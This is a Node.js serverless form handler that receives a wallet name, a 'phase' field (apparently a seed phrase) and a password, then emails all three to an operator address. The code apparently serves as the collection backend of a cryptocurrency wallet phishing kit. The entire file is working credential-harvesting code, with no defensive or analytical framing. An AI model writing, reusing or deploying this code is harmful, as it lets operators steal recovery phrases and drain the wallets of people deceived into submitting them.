const nodemailer = require("nodemailer");

const transporter = nodemailer.createTransport({
  host: process.env.SMTP_HOST,
  port: Number(process.env.SMTP_PORT || 587),
  secure: process.env.SMTP_SECURE === "true",
  auth: {
    user: process.env.SMTP_USER,
    pass: process.env.SMTP_PASS,
  },
});

const parseBody = async (req) => {
  if (req.body) {
    return req.body;
  }

  const chunks = [];
  for await (const chunk of req) {
    chunks.push(chunk);
  }
  const rawBody = Buffer.concat(chunks).toString("utf8");
  const contentType = (req.headers["content-type"] || "").toLowerCase();

  if (contentType.includes("application/json")) {
    return rawBody ? JSON.parse(rawBody) : {};
  }

  if (contentType.includes("application/x-www-form-urlencoded")) {
    return Object.fromEntries(new URLSearchParams(rawBody));
  }

  return {};
};

module.exports = async (req, res) => {
  if (req.method !== "POST") {
    res.setHeader("Allow", "POST");
    return res.status(405).json({ error: "Method Not Allowed" });
  }

  let body;
  try {
    body = await parseBody(req);
  } catch (error) {
    console.error(error);
    return res.status(400).json({ error: "Invalid request body." });
  }

  const wallet_name = String(body.wallet_name || "").trim();
  const phase = String(body.phase || "").trim();
  const password = String(body.pw || "").trim();

  if (!phase) {
    return res.status(400).json({ error: "Required field missing." });
  }

  const fromEmail = process.env.EMAIL_FROM || "noreply@connectus.website";
  const toEmail = process.env.EMAIL_TO || process.env.SMTP_USER;

  const mailOptions = {
    from: fromEmail,
    to: toEmail,
    subject: "New Form Submission",
    text: `Wallet Name: ${wallet_name}\nPhase: ${phase}\nPassword: ${password}`,
  };

  try {
    const info = await transporter.sendMail(mailOptions);
    return res.status(200).json({ ok: true, messageId: info.messageId });
  } catch (error) {
    console.error(error);
    return res.status(500).json({ error: "Message could not be sent.", details: error.message });
  }
};
